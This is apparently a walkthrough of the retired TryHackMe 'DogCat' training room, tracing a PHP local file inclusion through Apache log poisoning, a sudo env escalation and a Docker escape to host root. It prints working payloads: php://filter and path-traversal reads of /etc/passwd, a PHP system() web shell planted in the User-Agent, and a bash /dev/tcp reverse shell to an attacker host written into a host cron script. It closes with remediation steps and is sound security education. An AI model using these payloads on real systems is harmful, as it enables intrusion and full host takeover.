# TryHackMe: DogCat — From an `?view=` Parameter to Root on the Docker Host

*A walkthrough of the "DogCat" room. One sloppy PHP `include()` turns an
anonymous HTTP request into a full host compromise: local file inclusion becomes
arbitrary file read, then remote code execution via log poisoning, then container
root through a sudo mistake, and finally a Docker escape to root on the host.*

> Flag values are redacted. DogCat is a retired training box on TryHackMe;
> everything here was done against an authorized practice target.

---

## TL;DR — the whole chain in one line

`?view=` LFI → arbitrary file read → Apache access-log poisoning → RCE as
`www-data` → `sudo env` → container root → writable root-cron `backup.sh` →
**host root**.

Four privilege levels, four flags, and the only thing you need to start is the
ability to send HTTP requests to the site.

## The target

```bash
export IP=<target-ip>
nmap -sC -sV -p- -T4 --min-rate=1000 $IP
```

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.38 ((Debian))   # title: "dogcat"
```

Just SSH and a website. The site is a tiny gallery that shows you a dog or a cat.
The interesting part is the URL: `/?view=dog`. Any time a web app takes a
filename-looking value in the query string, you should immediately wonder what it
does with it.

## Root cause: user input flows into `include()`

We'll recover the source in Stage 1, but it's worth seeing the bug up front. The
gallery handler looks like this:

```php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';   // extension is attacker-controlled
if (isset($_GET['view'])) {
    if (containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;                 // user input -> include()
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
```

Two flaws combine into one powerful primitive:

1. The only guard is a substring check for `dog` or `cat` **anywhere** in the
   path. That's trivially satisfied with something like `dogs/../`.
2. `ext` is read from the query string, so the hardcoded `.php` suffix — the one
   thing that would otherwise force every include to be a PHP file — is cancelled
   just by sending `&ext=` (empty).

Put together: we can make the app `include()` any path we like, with any (or no)
extension. That's Local File Inclusion.

## Stage 1 — LFI to source code and arbitrary file read *(anonymous)*

First, read the app's own source with the `php://filter` wrapper, which returns a
file base64-encoded instead of executing it. A `dog` is smuggled into the path to
pass the substring filter:

```bash
curl -s "http://$IP/?view=php://filter/convert.base64-encode/resource=./dog/../index"
# -> a base64 blob = the full source of index.php
```

Decode that and you have the vulnerable code above. Now empty out `ext` and the
include becomes a plain file read — straight into `/etc/passwd`:

```bash
curl -s "http://$IP/?view=dog/../../../../../../etc/passwd&ext="
# root:x:0:0:root:/root:/bin/bash
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# ...
```

The first flag lives in the source of `flag.php`, again read via the base64
filter (value redacted).

**Primitive gained:** read any file the web server user can reach.

## Stage 2 — Log poisoning to turn "read" into "execute" *(www-data)*

File read is nice, but we want code execution. The classic pivot: the Apache
access log is world-readable and stores the raw `User-Agent` header verbatim. So
we write PHP *into* the log by sending it as our User-Agent, then `include` the
log with the same LFI:

```bash
# 1) plant PHP in the access log via the User-Agent header
curl -s "http://$IP/" -A "<?php system(\$_GET['c']); ?>"

# 2) include the log, and pass a shell command in c=
curl -s "http://$IP/?view=dog/../../../../../../var/log/apache2/access.log&ext=&c=id"
# ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The read primitive just became a shell.

**Primitive gained:** arbitrary command execution as `www-data`.

## Stage 3 — Container root via a sudo mistake *(root, in the container)*

Whenever you get a shell, check your sudo rights:

```bash
sudo -l
# User www-data may run the following commands on a4d1fcae8209:
#     (root) NOPASSWD: /usr/bin/env
```

`www-data` can run `/usr/bin/env` as root with no password. [GTFOBins](https://gtfobins.github.io/gtfobins/env/)
notes that `env` can launch a program — so point it at a shell and it hands you
root:

```bash
sudo env /bin/bash
# id -> uid=0(root)
```

Container root unlocks flags 2 and 3 (one in the webroot, one in `/root` that
`www-data` couldn't read). But the hostname `a4d1fcae8209` and a `/.dockerenv`
file tell us we're boxed inside a container. Flag 3's hint says it out loud:
*different environments*. We're root — but not on the real machine yet.

## Stage 4 — Breaking out of the container to host root *(root, on the host)*

The escape hides in the mount table. `/opt/backups` is bind-mounted from the
host's real disk — a shared door between container and host:

```bash
cat /proc/mounts | grep backups
# /dev/nvme1n1p2 /opt/backups ext4 rw,relatime   <- shared with the host

cat /opt/backups/backup.sh
# #!/bin/bash
# tar cf /root/container/backup/backup.tar /root/container

ls -la /opt/backups/backup.tar   # the mtime advances every minute
```

That last detail is the whole game: the backup archive's timestamp updates every
minute, which means **a cron job on the host is running `backup.sh` as root** —
and the script sits on a mount we can write to. So we overwrite it with a reverse
shell and wait one tick:

```bash
# on the attacker box:
nc -lnvp 4444

# in the container root shell, replace backup.sh:
echo '#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > /opt/backups/backup.sh

# ~1 minute later a root shell lands on the listener — this time on the HOST
cat /root/flag4.txt        # final flag (redacted)
```

**Full compromise:** a container-to-host escape through a writable, root-scheduled
script on a shared mount. A gallery's `?view=` parameter now owns the entire
machine.

## Severity

**CVSS 3.1 — 9.8 (Critical)** · `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`.
Network-reachable, no authentication, no user interaction, and the scope changes:
the vulnerable web app leads to compromise of the host it runs on. Complete loss
of confidentiality, integrity, and availability.

## Remediation — any single rung breaks the chain

1. **The `include()`** — never pass user input to `include`. Map `view` to an
   allow-list of known files (`['dog' => 'dog.php', ...]`), drop the
   user-controlled `ext`, and set `allow_url_include=Off` to kill wrapper abuse.
2. **Log exposure** — keep `/var/log` unreadable to the web user; once includes
   are allow-listed, log poisoning dies anyway (defense in depth).
3. **The sudo rule** — remove `NOPASSWD: /usr/bin/env`. A shell-spawning binary
   granted as root *is* root.
4. **The container boundary** — don't bind-mount a directory that a root host
   cron executes into a container that can write it. Run the job from a path the
   container can't touch, mount it read-only, and drop privileges.

## Takeaways

- **A filename in the URL is a question you must answer.** `?view=` screamed LFI;
  everything downstream followed from testing that one parameter.
- **File read and code execution are closer than they look.** Log poisoning (or
  `php://filter`, `data://`, session files, `/proc/self/environ`) routinely
  bridges the two.
- **Getting root doesn't mean you're done — check *which* root.** `/.dockerenv`,
  the hostname, and the mount table tell you whether you're in a container and
  where the walls are thin.
- **Shared mounts plus root cron equal game over.** A writable script executed by
  the host as root is the cleanest container escape there is.

Thanks for reading. DogCat is a fantastic room precisely because each stage is a
different *class* of bug — inclusion, log poisoning, sudo, container escape — so
finishing it means you actually understand four techniques, not one exploit.
